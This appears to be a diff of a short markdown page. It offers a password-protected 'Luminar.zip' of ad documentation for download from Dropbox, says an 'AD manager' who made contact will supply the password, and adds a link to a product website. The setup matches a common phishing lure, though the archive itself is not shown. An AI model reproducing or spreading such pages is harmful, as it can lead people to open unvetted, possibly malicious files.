@@ -20,3 +20,5 @@
 * Password for the archive will be provided by our AD manager, who contacted you.
 
 ### [Download AD documentation](https://www.dropbox.com/s/ubz65blwb84lo35/Luminar.zip?dl=1)
+
+[Main website](https://skylum.com/luminar-ai-b)
